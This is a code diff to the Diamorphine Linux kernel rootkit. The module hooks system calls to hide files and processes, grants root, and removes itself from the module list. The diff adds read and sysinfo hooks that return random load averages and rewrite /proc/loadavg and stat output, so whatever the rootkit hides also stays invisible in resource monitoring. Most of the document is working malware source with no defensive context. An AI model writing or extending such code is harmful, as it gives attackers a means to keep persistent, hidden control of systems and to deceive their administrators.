@@ -1,3 +1,5 @@
+#include <linux/delay.h>
+#include <asm/delay.h>
 #include <asm/uaccess.h>
 #include <linux/sched.h>
 #include <linux/module.h>
@@ -5,6 +7,14 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
+#include <linux/random.h>
+#include <linux/sched.h>
+#include <linux/file.h>
+#include <linux/fcntl.h>
+#include <linux/uio.h>
+#include "customfuncs.c"
+#define LOAD_INT(x) ((x) >> FSHIFT)
+#define LOAD_FRAC(x) LOAD_INT(((x) & (FIXED_1-1)) * 100)
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
 	#include <linux/proc_ns.h>
 #else
@@ -25,9 +35,13 @@ typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
 	struct linux_dirent64 *, unsigned int);
 typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+typedef asmlinkage int (*orig_sysinfo_t)(struct sysinfo*);
+typedef asmlinkage ssize_t (*orig_read_t)(unsigned int, char *, size_t);
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
+orig_sysinfo_t orig_sysinfo;
+orig_read_t orig_read;
 
 unsigned long *
 get_syscall_table_bf(void)
@@ -95,8 +109,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 #else
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		proc = 1;
 
 	while (off < ret) {
@@ -123,8 +136,7 @@ out:
 	return ret;
 }
 
-asmlinkage int
-hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	unsigned int count)
 {
 	int ret = orig_getdents(fd, dirent, count), err;
@@ -150,8 +162,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
 
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		proc = 1;
 
 	while (off < ret) {
@@ -211,15 +222,8 @@ give_root(void)
 static inline void
 tidy(void)
 {
-//	kfree(THIS_MODULE->notes_attrs);
-//	THIS_MODULE->notes_attrs = NULL;
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
-//	kfree(THIS_MODULE->mkobj.mp);
-//	THIS_MODULE->mkobj.mp = NULL;
-//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
-//	kfree(THIS_MODULE->mkobj.drivers_dir);
-//	THIS_MODULE->mkobj.drivers_dir = NULL;
 }
 
 static struct list_head *module_previous;
@@ -228,8 +232,6 @@ void
 module_show(void)
 {
 	list_add(&THIS_MODULE->list, module_previous);
-	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
-	//			MODULE_NAME);
 	module_hidden = 0;
 }
 
@@ -238,8 +240,6 @@ module_hide(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	//kobject_del(&THIS_MODULE->mkobj.kobj);
-	//list_del(&THIS_MODULE->mkobj.kobj.entry);
 	module_hidden = 1;
 }
 
@@ -267,6 +267,62 @@ hacked_kill(pid_t pid, int sig)
 	return 0;
 }
 
+asmlinkage ssize_t hacked_read(unsigned int fd, char *buf, size_t len)
+{
+	ssize_t out = orig_read(fd,buf,len);
+	const unsigned char *szName = NULL;
+	unsigned int lenName = 0;
+	char szCompare[] = LOADAVG;
+	char szCompare2[] = STAT;
+	char szLoads[20] = "";
+	char szRest[30] = "";
+	struct dentry *dparent;
+	if(len >= 10 && out >=0 && buf)
+	{
+		#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+			szName = current->files->fdt->fd[fd]->f_dentry->d_name.name;
+			lenName = current->files->fdt->fd[fd]->f_dentry->d_name.len;
+			dparent = current->files->fdt->fd[fd]->f_dentry->d_parent;
+		#else
+			szName = current->files->fdt->fd[fd]->f_path.dentry->d_name.name;
+			lenName = current->files->fdt->fd[fd]->f_path.dentry->d_name.len;
+			dparent = current->files->fdt->fd[fd]->f_path.dentry->d_parent;
+		#endif
+		if(checkParent(dparent))
+		{
+			if(myMemcmp(szName, szCompare, lenName, sizeof(LOADAVG)-1))
+			{
+				generateLoads(szLoads);
+				getFrontPart(szRest, buf);
+				buf[0] = 0;
+				myStrCat(buf, szLoads);
+				myStrCat(buf, szRest);
+			}
+			else if(myMemcmp(szName, szCompare2, lenName, sizeof(STAT)-1))
+			{
+				processStat(buf, len);
+			}
+		}
+	}
+	return out;
+}
+
+asmlinkage int hacked_sysinfo(struct sysinfo *info)
+{
+	int out = orig_sysinfo(info);
+	if(out >= 0)
+	{
+		int i = 0;
+		for(i = 0; i < 3; i++)
+		{
+			short unsigned int load = 0;
+			get_random_bytes(&load, sizeof(short unsigned int));
+			info->loads[i] = load / 10;
+		}
+	}
+	return out;
+}
+
 static inline void
 protect_memory(void)
 {
@@ -288,17 +344,20 @@ diamorphine_init(void)
 
 	cr0 = read_cr0();
 
-	module_hide();
 	tidy();
 
 	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+	orig_sysinfo = (orig_sysinfo_t)__sys_call_table[__NR_sysinfo];
+	orig_read = (orig_read_t)__sys_call_table[__NR_read];
 
 	unprotect_memory();
 	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+	__sys_call_table[__NR_sysinfo] = (unsigned long)hacked_sysinfo;
+	__sys_call_table[__NR_read] = (unsigned long)hacked_read;
 	protect_memory();
 
 	return 0;
@@ -311,6 +370,8 @@ diamorphine_cleanup(void)
 	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+	__sys_call_table[__NR_sysinfo] = (unsigned long)orig_sysinfo;
+	__sys_call_table[__NR_read] = (unsigned long)orig_read;
 	protect_memory();
 }
 
@@ -319,4 +380,4 @@ module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+MODULE_DESCRIPTION("diamorphine");
